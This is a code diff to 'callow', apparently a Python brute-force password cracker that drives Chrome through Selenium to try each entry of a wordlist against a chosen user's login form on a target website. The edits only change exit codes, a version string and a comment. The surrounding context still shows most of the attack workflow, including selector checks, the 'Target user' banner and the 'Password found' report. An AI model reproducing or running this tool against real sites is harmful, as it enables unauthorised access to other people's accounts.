@@ -36,7 +36,7 @@ banner = color.PURPLE + '''
    | |__| (_| | | | (_) \\ V  V /
     \\____\\__,_|_|_|\\___/ \\_/\\_/
 
-{0}[#] {1}maximousblk/callow@v1.2
+{0}[#] {1}maximousblk/callow@v1.3
 '''.format(color.CYAN, color.WHITE)
 
 
@@ -52,16 +52,16 @@ def wizard():
             print(color.GREEN + '[OK]\n'+color.WHITE)
         else: # If the website is inaccessible
             print(color.RED + '[X]' + '\n[!] '+color.WHITE + 'Could not connect to ' + website)
-            exit()
+            exit(1)
     except KeyboardInterrupt: # If user exits the program manually
         print(color.RED + '\n[!] '+ color.WHITE + 'Process terminated by user. Exiting...')
-        exit()
+        exit(0)
     except requests.exceptions.MissingSchema: # Protocol (http/https) is missing from the URL
         print(color.RED + '[X]' + '\n[!] '+color.WHITE + 'Invalid URL. Make sure you use http/https only.')
-        exit()
+        exit(1)
     except requests.ConnectTimeout: # If page takes too late to respond
         print(color.RED + '[X]' + '\n[!] '+color.WHITE + 'Connection timed out')
-        exit()
+        exit(1)
     try: # Collect information
         usersel = input( color.GREEN + '[~] ' + color.WHITE + 'Username input selector: ') # Css selector for username input field
         passsel = input( color.GREEN + '[~] ' + color.WHITE + 'Password input selector: ') # Css selector for password input field
@@ -71,7 +71,7 @@ def wizard():
         crack(username, usersel, passsel, passlist, website) # Start the attack
     except KeyboardInterrupt: # If user exits the program manually
         print(color.RED + '\n[!] '+color.WHITE + 'Process terminated by user. Exiting...')
-        exit()
+        exit(0)
 
 
 # Main brute-force function
@@ -80,7 +80,7 @@ def crack(username, usersel, passsel, passlist, website):
         f = open(passlist, 'r')
     except FileNotFoundError: # If list was not found
         print(color.RED + '\n[!] '+color.WHITE + 'Password list not found')
-        exit()
+        exit(1)
     chrome_options = webdriver.ChromeOptions()
     chrome_options.add_argument("--disable-popup-blocking")
     chrome_options.add_argument("--disable-extensions")
@@ -91,18 +91,18 @@ def crack(username, usersel, passsel, passlist, website):
         browser.implicitly_wait(2)
     except selenium.common.exceptions.WebDriverException: # If ChromeDriver binary was not found
         print(color.RED + '\n[!] '+color.WHITE + 'ChromeDriver binary not found')
-        exit()
+        exit(1)
     browser.get(website) # Open target website
     try: # Check if username field css selector is valid and available
         browser.find_element(By.CSS_SELECTOR, value=usersel)
     except selenium.common.exceptions.NoSuchElementException: # If the selector is invalid
         print(color.RED + '\n[!] '+ color.WHITE + 'Username field selector is invalid.')
-        exit()
+        exit(1)
     try: # Check if password field css selector is valid and available
         browser.find_element(By.CSS_SELECTOR, value=passsel)
     except selenium.common.exceptions.NoSuchElementException: # If the selector is invalid
         print(color.RED + '\n[!] '+ color.WHITE + 'Password field selector is invalid.')
-        exit()
+        exit(1)
     print(color.GREEN + '\nTarget user: ' + color.RED + username + color.WHITE + '\n') # Print username of the target
     try: # Start the attack
         for password in f: # Run the attack untill the password list is over
@@ -114,11 +114,11 @@ def crack(username, usersel, passsel, passlist, website):
         print(color.RED + '\n[!] '+color.WHITE + 'Sorry, password could not be found') # Message for if the password list is over and the password was not found
     except KeyboardInterrupt: # If user exits the program manually
         print(color.RED + '\n[!] '+color.WHITE + 'Process terminated by user. Exiting...')
-        exit()
-    except selenium.common.exceptions.NoSuchElementException: # If the password or username field gets hidden, that means either the password is found if you are IP banned
+        exit(0)
+    except selenium.common.exceptions.NoSuchElementException: # If the password or username field gets hidden, that means either the password is found (or you are IP banned)
         print(color.GREEN + '\n[#] ' + color.WHITE + 'Password found: ' + color.CYAN + tried)
         print(color.YELLOW + 'Happy to help ;)' + color.WHITE)
-        exit()
+        exit(0)
 
 
 # Tests to check if the arguments are valid
@@ -148,14 +148,14 @@ else: # If all arguments are present
             print(color.GREEN + '[OK]\n'+color.WHITE)
         else: # If the website is inaccessible
             print(color.RED + '[X] ' + '\n[!]'+color.WHITE + 'Could not connect to ' + options.website)
-            exit()
+            exit(1)
     except KeyboardInterrupt: # If user exits the program manually
         print(color.RED + '\n[!] '+color.WHITE + 'Process terminated by user. Exiting...')
-        exit()
+        exit(0)
     except requests.exceptions.MissingSchema: # Protocol (http/https) is missing from the URL
         print(color.RED + '[X] ' + '\n[!]'+color.WHITE + 'Invalid URL. Make sure you use http/https only.')
-        exit()
+        exit(1)
     except requests.ConnectTimeout: # If page takes too late to respond
         print(color.RED + '[X] ' + '\n[!]'+color.WHITE + 'Connection timed out')
-        exit()
+        exit(1)
     crack(options.username, options.usersel, options.passsel, options.passlist, options.website) # Start the attack
